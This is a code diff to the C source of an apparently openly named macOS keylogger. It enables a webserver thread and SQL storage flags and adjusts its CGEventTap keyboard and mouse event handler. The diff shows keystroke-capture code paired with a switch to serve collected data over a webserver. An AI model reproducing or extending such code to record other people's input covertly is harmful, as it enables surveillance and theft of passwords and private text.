@@ -3,6 +3,8 @@
 #define DELETE_DATABASE_FILE    true
 #define LOG_TIME_ENABLED        false
 #define LOG_PATH_ENABLED        true
+#define WEBSERVER_ENABLED        true
+#define SQL_ENABLED        true
 /**********************************/
 #include "../include/keylogger.h"
 #include "../src/includes.c"
@@ -19,7 +21,7 @@ volatile unsigned int windows_qty = 0;
 #include "keybinds.c"
 #include "osx_utils.c"
 /**********************************/
-//#include "webserver.c"
+#include "webserver.c"
 
 
 /**********************************/
@@ -177,13 +179,15 @@ void init_sql(){
 
 /**********************************/
 void init(const int argc, const char **argv){
+  started          = timestamp();
   term_hide_cursor();
   log_set_level(MY_LOG_LEVEL);
   config_main(argc, argv);
-  init_sql();
-  //webserver_thread();
+  if(SQL_ENABLED)
+      init_sql();
+  if(WEBSERVER_ENABLED)
+      webserver_thread();
   keystates        = list_new();
-  started          = timestamp();
   downkeys         = list_new();
   downkeys_history = list_new();
   mouse_location   = CGEventGetLocation(event_handler);
@@ -215,10 +219,11 @@ CGEventRef ___event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef 
     last_ts = ts;
   }
 
-
+  if(mouse_events_qty == 0 || is_mouse){
+    mouse_location = CGEventGetLocation(event);
+  }
   if (is_mouse) {
     mouse_events_qty++;
-    mouse_location = CGEventGetLocation(event);
   }else if (is_keyboard) {
     kb_events_qty++;
     if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) {
